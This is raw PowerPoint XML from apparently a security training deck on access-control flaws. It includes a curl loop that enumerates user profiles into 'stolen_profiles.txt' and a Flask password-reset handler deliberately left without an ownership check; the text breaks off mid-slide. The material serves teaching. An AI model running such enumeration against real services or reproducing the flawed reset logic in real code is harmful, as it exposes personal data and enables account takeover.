                <a:latin typeface="Petrona Light" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Light" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Light" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>02</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Shape 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7343537" y="3308271"/>
            <a:ext cx="3884414" cy="15240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="007EBD"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7343537" y="3395424"/>
            <a:ext cx="2164318" cy="185976"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="non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Attacker views their own profile</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Shape 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7343537" y="3645098"/>
            <a:ext cx="3884414" cy="1394817"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3415"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Shape 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7337941" y="3645098"/>
            <a:ext cx="3895606" cy="1394817"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1220"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Text 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7451288" y="3730109"/>
            <a:ext cx="3668911" cy="1224796"/>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GET /api/profile/5001</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Authorization: Bearer attacker_token</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Response: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"userId": 5001,</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"username": "attacker",</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"email": "attacker@evil.com",</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"phone": "555-0001",</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"address": "123 Evil St"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p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Text 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="5181600"/>
            <a:ext cx="113348" cy="141684"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="850" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Petrona Light" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Light" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Light" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>03</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Shape 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="5359003"/>
            <a:ext cx="3884414" cy="15240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="007EBD"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Text 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="5446157"/>
            <a:ext cx="2220992" cy="185976"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="non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Attacker enumerates other users</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Shape 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="5695831"/>
            <a:ext cx="3884414" cy="986552"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4828"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Shape 24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3396853" y="5695831"/>
            <a:ext cx="3895606" cy="986552"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1724"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="Text 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3510201" y="5780842"/>
            <a:ext cx="3668911" cy="816531"/>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Try sequential user IDs</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for i in {1..10000}; do</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curl -s "https://example.com/api/profile/$i"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-H "Authorization: Bearer attacker_token"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&gt;&gt; stolen_profiles.txt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done</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Text 26"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7343537" y="5181600"/>
            <a:ext cx="113348" cy="141684"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="850" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Petrona Light" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Light" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Light" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>04</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="Shape 27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7343537" y="5359003"/>
            <a:ext cx="3884414" cy="15240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="007EBD"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30" name="Text 28"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7343537" y="5446157"/>
            <a:ext cx="1488519" cy="185976"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="non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Mass data extraction</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31" name="Text 29"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7343537" y="5666065"/>
            <a:ext cx="3884414" cy="136088"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="850" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Attacker extracts 10,000 user profiles including:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="Text 30"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7343537" y="5836087"/>
            <a:ext cx="3884414" cy="816582"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="850" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Full names</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="850" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Email addresses</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="850" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Phone numbers</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="850" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Home addresses</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="850" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Date of birth</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="850" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Private photos</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="Shape 31"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="6801378"/>
            <a:ext cx="7825502" cy="1007745"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4727"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="B3E5FF"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="34" name="Image 0" descr="preencoded.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3515797" y="6893294"/>
            <a:ext cx="185976" cy="148828"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="35" name="Text 32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3815120" y="6886388"/>
            <a:ext cx="1488519"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Impact:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="36" name="Text 33"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3815120" y="7129038"/>
            <a:ext cx="7299484" cy="544388"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="850" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>10,000 users' personal information exposed</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="850" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>GDPR violation</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="850" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Potential identity theft</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="850" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Privacy breach lawsuit</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02449" y="311825"/>
            <a:ext cx="5966222"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Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>6.2 Banking Application - Account Takeover</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="706517"/>
            <a:ext cx="2371368"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Scenario: Online Banking Platform</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="915114"/>
            <a:ext cx="2511147"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Vulnerable Password Reset Function:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="1186101"/>
            <a:ext cx="7825502" cy="2619613"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1818"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3396853" y="1186101"/>
            <a:ext cx="7836694" cy="2619613"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 649"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3510201" y="1271111"/>
            <a:ext cx="7609999" cy="2449592"/>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Flask - VULNERABLE CODE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@app.route('/api/reset-password', methods=['POST'])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def reset_password():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data = request.get_json()</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user_id = data.get('user_id')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new_password = data.get('new_password')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reset_token = data.get('reset_token')</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 Validates token but doesn't check ownership</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token = ResetToken.query.filter_by(token=reset_token).first()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if token and not token.expired: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 NO CHECK: Does this user_id match the token's user?</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user = User.query.get(user_id)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user.password = hash_password(new_password)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db.session.commit()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return jsonify({'status': 'success'})</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return jsonify({'status': 'invalid token'}), 400</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="3890724"/>
            <a:ext cx="1488519"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Attack Flow:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9" name="Image 0" descr="preencoded.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="4161711"/>
            <a:ext cx="3912751" cy="453628"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3515797" y="4672013"/>
            <a:ext cx="2242304" cy="185976"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="non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Attacker requests password reset</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3515797" y="4921687"/>
            <a:ext cx="3686056" cy="1258729"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3784"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Shape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3510201" y="4921687"/>
            <a:ext cx="3697248" cy="1258729"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1352"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3623548" y="5006697"/>
            <a:ext cx="3470553" cy="1088708"/>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POST /api/request-reset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"email": "attacker@evil.com"</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Response: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"message": "Reset link sent to email",</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"token": "abc123xyz789"</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p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="14" name="Image 1" descr="preencoded.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="4161711"/>
            <a:ext cx="3912751" cy="453628"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7428548" y="4672013"/>
            <a:ext cx="2687598" cy="185976"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="non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Attacker receives legitimate reset token</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7428548" y="4891921"/>
            <a:ext cx="3686056" cy="408265"/>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latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Email received:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="850" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Reset your password:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
